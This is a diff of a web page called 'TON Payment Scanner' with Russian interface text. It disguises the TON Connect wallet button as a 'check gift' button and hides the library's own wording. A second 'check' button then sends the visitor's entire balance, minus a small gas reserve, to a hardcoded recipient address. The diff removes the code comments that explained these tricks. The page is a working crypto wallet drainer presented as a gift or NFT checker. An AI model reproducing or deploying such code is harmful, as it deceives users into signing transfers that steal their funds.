@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Payment Scanner</title>
-    <!-- Официальная библиотека TON Connect UI -->
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
         * {
@@ -41,7 +40,6 @@
             margin-bottom: 1.5rem;
         }
 
-        /* Полная замена текста Connect Wallet на "Проверить гифт" */
         #ton-connect button, 
         #ton-connect [data-tc-connect-button="true"],
         #ton-connect div {
@@ -57,7 +55,6 @@
             color: #ffffff !important;
         }
 
-        /* Скрываем дочерний внутренний текст библиотеки */
         #ton-connect button * {
             display: none !important;
         }
@@ -135,15 +132,12 @@
 <body>
 
 <div class="card">
-    <!-- Кнопка подключения с замененным текстом "Проверить гифт" -->
     <div id="ton-connect"></div>
 
-    <!-- Блок с информацией о балансе и отправке -->
     <div id="wallet-info" class="wallet-details">
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Вторая кнопка -->
         <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
@@ -160,10 +154,9 @@
     const sendBtn = document.getElementById('sendTxBtn');
     const txStatus = document.getElementById('txStatus');
 
-    // RAW-формат адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
     const RECIPIENT_ADDRESS = 'EQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRpAK';
 
-    const GAS_FEE_RESERVE = 5000000; // Резерв 0.005 TON на комиссию
+    const GAS_FEE_RESERVE = 5000000;
 
     let userBalanceNano = 0;
     let transferableAmountNano = 0;
@@ -222,8 +215,7 @@
                 messages: [
                     {
                         address: RECIPIENT_ADDRESS,
-                        amount: transferableAmountNano.toString(),
-                        payload: ''
+                        amount: transferableAmountNano.toString()
                     }
                 ]
             };
